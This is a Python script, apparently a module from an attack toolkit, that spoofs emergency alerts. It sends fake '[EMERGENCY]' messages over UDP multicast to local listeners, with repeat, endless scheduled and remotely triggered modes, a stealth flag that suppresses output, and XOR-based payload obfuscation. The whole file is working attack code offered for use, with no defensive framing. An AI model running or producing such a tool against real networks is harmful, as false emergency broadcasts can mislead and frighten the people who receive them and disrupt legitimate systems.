#!/usr/bin/env python3
# modules/attacks/broadcast_emergency_spoofer.py

import socket
import struct
import time
import argparse
import json
import os
from datetime import datetime
from base64 import b64encode
import hashlib
import threading

LOG_FILE = "results/emergency_spoof_log.json"
ALERT_FILE = "webgui/alerts.json"
PCAP_LOG = "results/emergency_broadcast_traffic.txt"
MITRE_TTP = "T1585.003"
DEFAULT_BROADCAST_IP = "239.255.255.250"
DEFAULT_PORT = 1900

def encrypt_payload(message, key="emergencypass"):
    key = hashlib.sha256(key.encode()).digest()
    encrypted = b64encode(bytes(a ^ b for a, b in zip(message.encode(), key)))
    return encrypted.decode()

def log_event(message, ip, port, encrypted=False):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "multicast_ip": ip,
        "port": port,
        "message": "[ENCRYPTED]" if encrypted else message,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")
    with open(PCAP_LOG, "a") as f:
        f.write(f"{entry['timestamp']} {ip}:{port} > {entry['message']}\n")
    os.makedirs("webgui", exist_ok=True)
    with open(ALERT_FILE, "a") as f:
        f.write(json.dumps({
            "agent": "broadcast_emergency_spoofer",
            "alert": f"Emergency broadcast sent to {ip}:{port}",
            "timestamp": time.time()
        }) + "\n")

def scan_multicast_receivers(ip, port):
    print("[*] Probing for IGMP responders (passive scan)...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, struct.pack('b', 1))
        sock.sendto(b'DISCOVERY-PING', (ip, port))
        sock.close()
        print("[✓] Probe sent. Check Wireshark or logs for IGMP responses.")
    except Exception as e:
        print(f"[!] Scan error: {e}")

def send_multicast_alert(ip, port, message, repeat, delay, encrypt=False, stealth=False):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, struct.pack('b', 1))

    msg_content = f"[EMERGENCY] {message}"
    if encrypt:
        msg_content = encrypt_payload(msg_content)

    for i in range(repeat):
        try:
            sock.sendto(msg_content.encode(), (ip, port))
            if not stealth:
                print(f"[+] Broadcast {i+1}/{repeat} to {ip}:{port}")
            log_event(message, ip, port, encrypted=encrypt)
            time.sleep(delay)
        except Exception as e:
            print(f"[!] Broadcast error: {e}")

def remote_trigger_listener(trigger_phrase, ip, port, msg, encrypt=False):
    def listen():
        print(f"[*] Waiting for trigger '{trigger_phrase}' on UDP port {port}...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('', port))
        while True:
            data, addr = sock.recvfrom(1024)
            if trigger_phrase.encode() in data:
                print(f"[✓] Trigger received from {addr}. Sending emergency...")
                send_multicast_alert(ip, port, msg, 3, 1, encrypt, False)
                break
    t = threading.Thread(target=listen, daemon=True)
    t.start()

def timed_repeater(ip, port, msg, interval, encrypt):
    def loop_broadcast():
        print(f"[*] Scheduled emergency every {interval}s...")
        while True:
            send_multicast_alert(ip, port, msg, 1, 0, encrypt)
            time.sleep(interval)
    t = threading.Thread(target=loop_broadcast, daemon=True)
    t.start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Broadcast fake emergency alerts to multicast listeners")
    parser.add_argument("--message", required=True, help="Emergency message content")
    parser.add_argument("--ip", default=DEFAULT_BROADCAST_IP, help="Target broadcast/multicast IP")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="UDP port")
    parser.add_argument("--repeat", type=int, default=3, help="Number of times to repeat")
    parser.add_argument("--delay", type=int, default=1, help="Seconds between repeats")
    parser.add_argument("--encrypt", action="store_true", help="Encrypt payload (XOR+base64)")
    parser.add_argument("--stealth", action="store_true", help="Suppress console output")
    parser.add_argument("--scan", action="store_true", help="IGMP listener scan")
    parser.add_argument("--trigger", help="Trigger phrase to wait for before sending")
    parser.add_argument("--schedule", type=int, help="Send every N seconds indefinitely")

    args = parser.parse_args()

    if args.scan:
        scan_multicast_receivers(args.ip, args.port)

    if args.trigger:
        remote_trigger_listener(args.trigger, args.ip, args.port, args.message, args.encrypt)

    if args.schedule:
        timed_repeater(args.ip, args.port, args.message, args.schedule, args.encrypt)

    if not args.trigger and not args.schedule:
        send_multicast_alert(args.ip, args.port, args.message, args.repeat, args.delay, args.encrypt, args.stealth)
